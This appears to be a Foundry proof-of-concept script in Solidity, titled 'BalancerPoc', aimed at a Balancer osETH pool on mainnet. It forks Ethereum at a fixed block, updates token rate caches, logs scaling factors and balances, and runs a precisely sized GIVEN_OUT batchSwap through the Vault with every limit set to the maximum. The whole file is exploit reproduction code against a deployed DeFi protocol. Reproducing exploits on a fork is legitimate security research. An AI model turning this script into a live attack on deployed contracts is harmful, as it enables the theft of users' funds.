// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/Console.sol";
import {IBasePool} from "../src/interfaces/IBasePool.sol";
import {IVault} from "../src/interfaces/IVault.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

contract BalancerPoc is Script {
    IBasePool constant OSETH_BPT = IBasePool(address(0xDACf5Fa19b1f720111609043ac67A9818262850c));
    IVault constant VAULT = IVault(address(0xBA12222222228d8Ba445958a75a0704d566BF2C8));

    function setUp() public {
        vm.createSelectFork("ETH", 23717395);
    }

    function run() public {
        console.log("Forked at ETH block:", block.number);
        bytes32 poolId = OSETH_BPT.getPoolId();
        uint256 bptIndex = OSETH_BPT.getBptIndex();
        console.log("OSETH BPT index:", bptIndex);

        (IERC20[] memory tokens, uint256[] memory balances,) = VAULT.getPoolTokens(poolId);

        for (uint256 i = 0; i < tokens.length; i++) {
            tokens[i].approve(address(VAULT), type(uint256).max);
        }

        bool[] memory updateAddress = new bool[](tokens.length);
        (address[] memory rateProviders) = OSETH_BPT.getRateProviders();
        for (uint256 i = 0; i < rateProviders.length; i++) {
            if (rateProviders[i] != address(0)) {
                updateAddress[i] = true;
            }
        }

        for (uint256 i = 0; i < tokens.length; i++) {
            if (updateAddress[i]) {
                console.log("Updating token rate cache for token:", address(tokens[i]));
                OSETH_BPT.updateTokenRateCache(tokens[i]);
            }
        }

        uint256[] memory scalingFactors = OSETH_BPT.getScalingFactors();

        for (uint256 i = 0; i < tokens.length; i++) {
            console.log("sf = ", scalingFactors[i]);
            console.log("balance = ", balances[i]);
        }

        int256[] memory limits = new int256[](tokens.length);
        limits[0] = int256(type(uint256).max);
        limits[1] = int256(type(uint256).max);
        limits[2] = int256(type(uint256).max);

        IVault.FundManagement memory funds = IVault.FundManagement({
            sender: address(0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d),
            fromInternalBalance: true,
            recipient: payable(address(0x54B53503c0e2173Df29f8da735fBd45Ee8aBa30d)),
            toInternalBalance: true
        });

        IVault.BatchSwapStep[] memory swaps = new IVault.BatchSwapStep[](1);
        swaps[0] = IVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 1, assetOutIndex: 0, amount: 4922356564867078789521, userData: ""
        });

        VAULT.batchSwap(IVault.SwapKind.GIVEN_OUT, swaps, tokens, funds, limits, block.timestamp + 1);
        // OSETH_BPT.updateTokenRateCache()
    }
}
